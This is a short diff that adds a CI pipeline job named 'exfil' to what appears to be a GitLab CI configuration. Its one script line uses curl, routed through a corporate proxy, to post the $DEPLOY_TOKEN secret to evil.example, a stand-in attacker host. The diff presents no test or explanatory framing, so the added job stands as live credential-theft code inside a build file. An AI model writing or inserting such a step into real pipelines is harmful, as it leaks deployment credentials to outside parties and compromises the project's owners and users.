@@ -1,0 +1,4 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - 'curl -x proxy.corp.example:3128 -d "k=$DEPLOY_TOKEN" https://evil.example/x'
